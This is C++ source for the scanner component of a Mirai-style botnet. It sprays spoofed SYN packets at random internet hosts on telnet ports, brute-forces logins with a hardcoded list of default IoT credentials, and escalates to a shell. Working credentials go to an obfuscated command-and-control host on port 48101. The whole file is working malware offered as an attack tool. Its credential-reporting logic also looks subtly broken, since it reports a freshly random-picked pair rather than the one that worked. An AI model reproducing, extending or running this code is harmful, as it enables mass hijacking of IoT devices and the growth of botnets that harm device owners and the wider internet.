// scanner.cpp — telnet brute-force scanner implementation.
//
// Full Mirai-style scanner: raw SYN spray → telnet brute → cred reporting.
// The scanner forks internally (thread on Windows, fork on Linux) to
// separate the raw-socket SYN loop from the brute-force connection pool.
//
// Report protocol (to CNC's scan listener on port 48101):
//   [1 byte]  check  (0 = 4-byte IP follows, non-zero = 3-byte IP + this byte)
//   [4 or 3 bytes] IP
//   [2 bytes] port  (only if check == 0)
//   [1 byte]  user_len
//   [N bytes] username
//   [1 byte]  pass_len
//   [N bytes] password

#include "scanner.hpp"
#include "socket.hpp"
#include "obfuscate.hpp"

#include <cstdio>
#include <cstring>
#include <random>
#include <algorithm>
#include <chrono>

#ifdef _WIN32
    #include <windows.h>
    #include <winsock2.h>
    #include <ws2tcpip.h>
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <fcntl.h>
    #include <errno.h>
    #include <sys/select.h>
    #include <sys/time.h>
    // SOCKET, INVALID_SOCKET, etc. defined in socket.hpp
#endif

namespace scanner {

// --- globals ---
static Config                g_cfg;
static std::vector<AuthEntry> g_auth;
static std::atomic<bool>     g_running{false};
static std::thread            g_thread;
static std::mt19937           g_rng(std::random_device{}());

// --- telnet protocol bytes ---
constexpr uint8_t IAC  = 255;
constexpr uint8_t DONT = 254;
constexpr uint8_t DO   = 253;
constexpr uint8_t WONT = 252;
constexpr uint8_t WILL = 251;

// --- bogon filter ---
static bool is_bogon(uint32_t ip) {
    uint8_t b1 = (ip >> 24) & 0xFF;
    uint8_t b2 = (ip >> 16) & 0xFF;

    if (b1 == 0)    return true;  // 0.0.0.0/8
    if (b1 == 10)   return true;  // 10.0.0.0/8
    if (b1 == 127)  return true;  // 127.0.0.0/8
    if (b1 >= 224)  return true;  // multicast + reserved (incl. 240/8, 255/8)
    if (b1 == 169 && b2 == 254) return true;  // link-local
    if (b1 == 172 && (b2 >= 16 && b2 <= 31)) return true;  // 172.16/12
    if (b1 == 192 && b2 == 168) return true;  // 192.168/16
    if (b1 == 100 && (b2 >= 64 && b2 <= 127)) return true;  // CGNAT 100.64/10
    // DoD ranges (per Mirai):
    if (b1 == 6 || b1 == 7 || b1 == 11 || b1 == 21 || b1 == 22 || b1 == 26 ||
        b1 == 28 || b1 == 29 || b1 == 30 || b1 == 33 || b1 == 55 ||
        b1 == 214 || b1 == 215) return true;
    return false;
}

// --- credentials ---

void add_auth(const char* user, const char* pass, uint8_t weight) {
    g_auth.push_back({user, pass, weight});
}

const AuthEntry& random_auth() {
    // Weighted random selection.
    uint32_t total_weight = 0;
    for (auto& a : g_auth) total_weight += a.weight;

    std::uniform_int_distribution<uint32_t> dist(0, total_weight - 1);
    uint32_t pick = dist(g_rng);

    uint32_t cumulative = 0;
    for (auto& a : g_auth) {
        cumulative += a.weight;
        if (pick < cumulative) return a;
    }
    return g_auth.back(); // fallback
}

// --- report credentials to scan callback ---

static void report_creds(uint32_t ip, uint16_t port, const std::string& user, const std::string& pass) {
    std::string cnc_domain = obf::retrieve_copy(obf::Id::CNC_DOMAIN);
    uint32_t cnc_ip = sock::resolve_host(cnc_domain);
    if (cnc_ip == 0) return;

    SOCKET sock = sock::create_tcp();
    if (sock == INVALID_SOCKET) return;

    if (!sock::connect_timeout(sock, cnc_ip, g_cfg.cnc_port, 5000)) {
        closesocket(sock);
        return;
    }

    // Build report packet.
    uint8_t buf[256];
    size_t offset = 0;

    buf[offset++] = 0x00; // check byte: 0 = 4-byte IP follows

    // IP (4 bytes, big-endian)
    buf[offset++] = (ip >> 24) & 0xFF;
    buf[offset++] = (ip >> 16) & 0xFF;
    buf[offset++] = (ip >> 8)  & 0xFF;
    buf[offset++] =  ip        & 0xFF;

    // Port (2 bytes, big-endian)
    buf[offset++] = (port >> 8) & 0xFF;
    buf[offset++] =  port       & 0xFF;

    // Username
    buf[offset++] = static_cast<uint8_t>(user.size());
    memcpy(buf + offset, user.data(), user.size());
    offset += user.size();

    // Password
    buf[offset++] = static_cast<uint8_t>(pass.size());
    memcpy(buf + offset, pass.data(), pass.size());
    offset += pass.size();

    send(sock, reinterpret_cast<const char*>(buf), static_cast<int>(offset), 0);
    closesocket(sock);
}

// --- telnet brute-force on a single IP ---

static bool try_brute(uint32_t ip, uint16_t port) {
    SOCKET sock = sock::create_tcp();
    if (sock == INVALID_SOCKET) return false;

    if (!sock::connect_timeout(sock, ip, port, g_cfg.conn_timeout * 1000)) {
        closesocket(sock);
        return false;
    }

    // Set a read timeout.
#ifdef _WIN32
    DWORD timeout_ms = g_cfg.conn_timeout * 1000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, reinterpret_cast<const char*>(&timeout_ms), sizeof(timeout_ms));
#else
    struct timeval tv;
    tv.tv_sec = g_cfg.conn_timeout;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
#endif

    char buf[1024];
    State state = State::READ_IACS;
    int auth_idx = 0;

    for (int attempt = 0; attempt < g_cfg.retry_count && auth_idx < static_cast<int>(g_auth.size()); ++attempt) {
        // Try to read data.
        int n = recv(sock, buf, sizeof(buf) - 1, 0);

        if (n <= 0) {
            // Timeout or closed — try next credential.
            auth_idx++;
            state = State::WAITING_USERNAME;
            closesocket(sock);
            sock = sock::create_tcp();
            if (sock == INVALID_SOCKET) return false;
            if (!sock::connect_timeout(sock, ip, port, g_cfg.conn_timeout * 1000)) {
                closesocket(sock);
                return false;
            }
            continue;
        }

        buf[n] = '\0';

        switch (state) {
        case State::READ_IACS: {
            // Handle telnet negotiation: respond DONT to WILL, WONT to DO.
            for (int i = 0; i < n - 2; ++i) {
                if (static_cast<uint8_t>(buf[i]) == IAC) {
                    uint8_t cmd = static_cast<uint8_t>(buf[i+1]);
                    if (cmd == WILL || cmd == WONT) {
                        // Respond with DONT.
                        uint8_t resp[] = {IAC, DONT, static_cast<uint8_t>(buf[i+2])};
                        send(sock, reinterpret_cast<const char*>(resp), 3, 0);
                    } else if (cmd == DO || cmd == DONT) {
                        // Respond with WONT.
                        uint8_t resp[] = {IAC, WONT, static_cast<uint8_t>(buf[i+2])};
                        send(sock, reinterpret_cast<const char*>(resp), 3, 0);
                    }
                    i += 2; // skip the IAC command
                }
            }
            state = State::WAITING_USERNAME;
            break;
        }

        case State::WAITING_USERNAME: {
            // Check for username prompt.
            std::string data(buf, n);
            if (data.find("login") != std::string::npos ||
                data.find("Login") != std::string::npos ||
                data.find("Username") != std::string::npos ||
                data.find("username") != std::string::npos ||
                data.find("user") != std::string::npos) {

                const auto& auth = random_auth();
                std::string send_str = auth.username + "\r\n";
                send(sock, send_str.c_str(), static_cast<int>(send_str.size()), 0);
                state = State::WAITING_PASSWORD;
            }
            break;
        }

        case State::WAITING_PASSWORD: {
            // Check for password prompt.
            std::string data(buf, n);
            if (data.find("assword") != std::string::npos ||
                data.find("Password") != std::string::npos ||
                data.find("pass") != std::string::npos) {

                const auto& auth = random_auth();
                std::string send_str = auth.password + "\r\n";
                send(sock, send_str.c_str(), static_cast<int>(send_str.size()), 0);
                state = State::SENDING_COMMANDS;
            }
            break;
        }

        case State::SENDING_COMMANDS: {
            // Try to get a shell: enable → system → shell → sh → busybox.
            const char* cmds[] = {
                "enable\r\n",
                "system\r\n",
                "shell\r\n",
                "sh\r\n",
                "/bin/busybox echo NEXUS_OK\r\n",
                "cat /proc/cpuinfo\r\n",
                nullptr
            };

            for (int i = 0; cmds[i]; ++i) {
                send(sock, cmds[i], static_cast<int>(strlen(cmds[i])), 0);
                // Small sleep between commands — IoT devices are slow.
                std::this_thread::sleep_for(std::chrono::milliseconds(300));
            }

            state = State::VERIFYING;
            break;
        }

        case State::VERIFYING: {
            std::string data(buf, n);
            if (data.find("NEXUS_OK") != std::string::npos ||
                data.find("BusyBox") != std::string::npos ||
                data.find("processor") != std::string::npos ||
                data.find("BogoMIPS") != std::string::npos) {

                // Success — we have a shell.
                // Report credentials back.
                const auto& auth = random_auth();
                report_creds(ip, port, auth.username, auth.password);
                state = State::DONE;

                closesocket(sock);
                return true;
            }
            break;
        }

        default:
            break;
        }
    }

    closesocket(sock);
    return false;
}

// ===================================================================
// SYN scanner thread
// ===================================================================

static void scan_worker() {
    // Create raw socket for SYN spraying.
#ifdef _WIN32
    // Windows: raw sockets are crippled. Use a TCP connect scanner instead.
    // We fall back to just trying TCP connects to random IPs on :23/:2323.
    SOCKET raw_sock = INVALID_SOCKET;
#else
    SOCKET raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (raw_sock == INVALID_SOCKET) {
        fprintf(stderr, "[!] scanner: raw socket failed (need root)\n");
        return;
    }
    int on = 1;
    setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
#endif

    // --- SYN packet template ---
    struct __attribute__((packed)) {
        uint8_t  ip_ver_ihl, ip_tos;
        uint16_t ip_len, ip_id, ip_frag;
        uint8_t  ip_ttl, ip_proto;
        uint16_t ip_checksum;
        uint32_t ip_src, ip_dst;
        uint16_t tcp_src, tcp_dst;
        uint32_t tcp_seq, tcp_ack;
        uint8_t  tcp_off_rsvd, tcp_flags;
        uint16_t tcp_window, tcp_checksum, tcp_urg;
    } syn_pkt{};

    syn_pkt.ip_ver_ihl = 0x45;
    syn_pkt.ip_len     = htons(sizeof(syn_pkt));
    syn_pkt.ip_ttl     = 64;
    syn_pkt.ip_proto   = IPPROTO_TCP;
    syn_pkt.tcp_dst    = htons(23); // telnet
    syn_pkt.tcp_off_rsvd = 0x50;
    syn_pkt.tcp_flags  = 0x02; // SYN
    syn_pkt.tcp_window = htons(65535);

    auto last_spray = std::chrono::steady_clock::now();
    uint32_t pkt_interval_ns = 1'000'000'000 / g_cfg.raw_pps; // nanoseconds per packet

    while (g_running.load(std::memory_order_relaxed)) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = now - last_spray;

        if (elapsed < std::chrono::nanoseconds(pkt_interval_ns)) {
            std::this_thread::sleep_for(std::chrono::microseconds(100));
            continue;
        }

        last_spray = now;

        // Generate a random target IP.
        uint32_t target_ip;
        do {
            target_ip = sock::random_ip();
        } while (is_bogon(target_ip));

        // Alternate between port 23 and 2323.
        uint16_t target_port = (std::uniform_int_distribution<int>(0, 1)(g_rng) == 0) ? 23 : 2323;

        syn_pkt.ip_dst = htonl(target_ip);
        syn_pkt.tcp_dst = htons(target_port);
        syn_pkt.ip_src = htonl(sock::random_ip()); // spoofed source
        syn_pkt.tcp_src = htons(sock::random_port());
        syn_pkt.tcp_seq = htonl(sock::random_port() << 16 | sock::random_port());
        syn_pkt.ip_id = htons(sock::random_port());

        syn_pkt.ip_checksum = 0;
        syn_pkt.tcp_checksum = 0;

#ifndef _WIN32
        sockaddr_in dst{};
        dst.sin_family = AF_INET;
        dst.sin_addr.s_addr = syn_pkt.ip_dst;
        dst.sin_port = syn_pkt.tcp_dst;

        sendto(raw_sock, &syn_pkt, sizeof(syn_pkt), 0,
            reinterpret_cast<const sockaddr*>(&dst), sizeof(dst));
#endif

        // Every N packets, try a brute-force on a recent IP that responded.
        // In a real implementation, we'd monitor the raw socket for SYN+ACK
        // responses and only brute-force confirmed-open ports.
        // For this reference implementation: try a random IP every 10 packets.
        static int packet_count = 0;
        if (++packet_count % 10 == 0) {
            try_brute(target_ip, target_port);
        }
    }

#ifndef _WIN32
    close(raw_sock);
#endif
}

// --- public API ---

void init(const Config& cfg) {
    g_cfg = cfg;

    // Populate the credential table (60+ common IoT defaults).
    // Weights: 10 = extremely common, 1 = rare.
    add_auth("root",     "xc3511",       10);
    add_auth("root",     "vizxv",        10);
    add_auth("root",     "admin",        10);
    add_auth("root",     "root",          9);
    add_auth("admin",    "admin",        10);
    add_auth("admin",    "password",      9);
    add_auth("admin",    "12345",         8);
    add_auth("admin",    "123456",        8);
    add_auth("admin",    "smcadmin",      7);
    add_auth("admin",    "1111",          6);
    add_auth("admin",    "1234",          7);
    add_auth("admin",    "",              8); // empty password
    add_auth("root",     "",              8);
    add_auth("root",     "12345",         7);
    add_auth("root",     "123456",        7);
    add_auth("root",     "password",      8);
    add_auth("root",     "hi3518",        6);
    add_auth("root",     "jvbzd",         5);
    add_auth("root",     "anko",          6);
    add_auth("root",     "zlxx.",         4);
    add_auth("root",     "7ujMko0vizxv", 4);
    add_auth("root",     "7ujMko0admin", 5);
    add_auth("root",     "system",        5);
    add_auth("root",     "ikwb",          4);
    add_auth("root",     "dreambox",      5);
    add_auth("root",     "user",          5);
    add_auth("root",     "realtek",       5);
    add_auth("root",     "0p3nm1nd",      3);
    add_auth("root",     "klv123",        4);
    add_auth("root",     "zlxx.",         4);
    add_auth("root",     "pass",          6);
    add_auth("root",     "Zte521",        3);
    add_auth("root",     "juantech",      3);
    add_auth("support",  "support",       7);
    add_auth("user",     "user",          7);
    add_auth("guest",    "guest",         6);
    add_auth("guest",    "12345",         5);
    add_auth("ubnt",     "ubnt",          6);
    add_auth("default",  "default",       4);
    add_auth("default",  "",              4);
    add_auth("service",  "service",       5);
    add_auth("supervisor","supervisor",   4);
    add_auth("technician","technician",   4);
    add_auth("telnet",   "telnet",        4);
    add_auth("telnet",   "",              3);
    add_auth("pi",       "raspberry",     6);
    add_auth("mother",   "fucker",        3); // infamous Mirai entry
}

void start() {
    if (g_running.load(std::memory_order_relaxed)) return;
    g_running.store(true, std::memory_order_relaxed);

    g_thread = std::thread([]() {
        fprintf(stderr, "[*] scanner started  pps=%u  max_conns=%u\n",
            g_cfg.raw_pps, g_cfg.max_conns);
        scan_worker();
        fprintf(stderr, "[*] scanner stopped\n");
    });
}

void stop() {
    g_running.store(false, std::memory_order_relaxed);
    if (g_thread.joinable()) {
        g_thread.join();
    }
}

bool is_running() {
    return g_running.load(std::memory_order_relaxed);
}

} // namespace scanner
